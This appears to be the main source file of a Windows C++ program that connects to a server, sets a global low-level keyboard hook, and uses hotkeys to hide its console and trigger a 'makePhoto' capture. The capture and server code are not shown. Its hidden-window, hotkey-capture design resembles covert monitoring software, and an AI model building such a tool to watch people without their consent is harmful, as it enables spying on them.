#include "Librarus.h"
#include "Manager.h"


static Manager manager;			 
static atomic<bool> toExit(false);
static bool isVisiable = true;   
static HHOOK hook;				

LRESULT CALLBACK keyboardHookHandler(int code, WPARAM wParam, LPARAM lParam) {
	if (toExit) {
		PostQuitMessage(0);
	}

	if (code == HC_ACTION) {
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;
		if (wParam == WM_KEYDOWN && (pKey->vkCode == 50 || pKey->vkCode == 49)) {
			if (manager.isActive) {       
				manager.getConsole().show();
				isVisiable = true;		   
				manager.isActive = false;  
			}
			else {                          
				manager.getConsole().hide();
				isVisiable = false;		  
				manager.isActive = true;
				if (pKey->vkCode == 49) {
					manager.makePhoto();
				}
			}
		}
		if (wParam == WM_KEYDOWN && pKey->vkCode == '3') {
			if (!isVisiable) manager.getConsole().show();   
			else manager.getConsole().hide();			    
			isVisiable = isVisiable == true ? false : true; 
		}
	}
	return CallNextHookEx(NULL, code, wParam, lParam);      
}

void menuHandler() {
	string command;      

	while (!toExit) {
		cout << "comand > ";  
		getline(cin, command);
		if (command == "photo") {
			isVisiable = false;
		}
		toExit = manager.doCommand(command);      
	}
}

int main() {
    setlocale(LC_ALL, "RU");

	Server server = Server();
	manager.server = server;
	manager.server.openServer();
	manager.server.connectServer();

	manager.help();               
	system("pause");                
	system("cls");                
	thread menuThread(menuHandler);

	MSG message;                
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookHandler, NULL, 0))) {
		cout << "Error: cannot set hook" << endl;
		exit(EXIT_FAILURE);             
	}

	while (!toExit) {                             
		GetMessage(&message, NULL, 0, 0);         
	}
	manager.isActive = false;                    

	UnhookWindowsHookEx(hook);   
	if (menuThread.joinable()) {
		menuThread.join();        
	}

	manager.server.sendMessage("disconnect");

	return 0;
}
